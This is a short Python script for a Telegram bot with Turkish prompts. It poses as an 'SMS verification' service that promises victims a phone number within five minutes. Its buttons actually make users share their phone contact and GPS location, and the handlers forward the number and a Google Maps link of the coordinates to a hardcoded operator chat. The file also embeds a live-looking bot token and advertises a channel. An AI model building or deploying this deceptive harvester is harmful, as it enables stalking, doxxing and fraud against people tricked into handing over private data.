import telebot
from telebot import types
Token='7337977655:AAFEUc6QJee1DyCELLWkOvY9YuxhqW7R06I'
bot = telebot.TeleBot(Token)
id = '5407630064'

@bot.message_handler(commands=['start'])
def register(message):
    keyboard = types.ReplyKeyboardMarkup(one_time_keyboard=True)
    reg_button = types.KeyboardButton(text="+90 sms onay için tıkla.", request_contact=True)
    location_button = types.KeyboardButton(text="+1 sms onay için tıkla.", request_location=True)
    keyboard.add(reg_button, location_button)
    response = bot.send_message(message.chat.id, "sms onay için lütfen izin verin.", reply_markup=keyboard)
@bot.message_handler(content_types=['contact'])
def contact_handler(message):
    num = message.contact.phone_number
    bot.send_message(id, text=f"tebrikler sms onay yaptınız numaranız 5dk içinde size iletilecektir. : {num} • ¢нαηηєℓ; @wotjexarsiv •")
    bot.send_message(message.chat.id, text="Thx :)")
@bot.message_handler(content_types=['location'])
def location_handler(message):
    loc = message.location
    lat = loc.latitude
    lon = loc.longitude
    bot.send_message(id, text=f'''
Mevcut Konumunuz :
 Enlem={lat}
 Boylam={lon}
 ● [ Google haritası ](https://www.google.com/maps/place/{lat},{lon})''',parse_mode='markdown')
    bot.send_message(message.chat.id, text="tebrikler sms onay yaptınız numaranız 5dk içinde size iletilecektir. • ¢нαηηєℓ; @wotjexarsiv :)")

bot.infinity_polling()
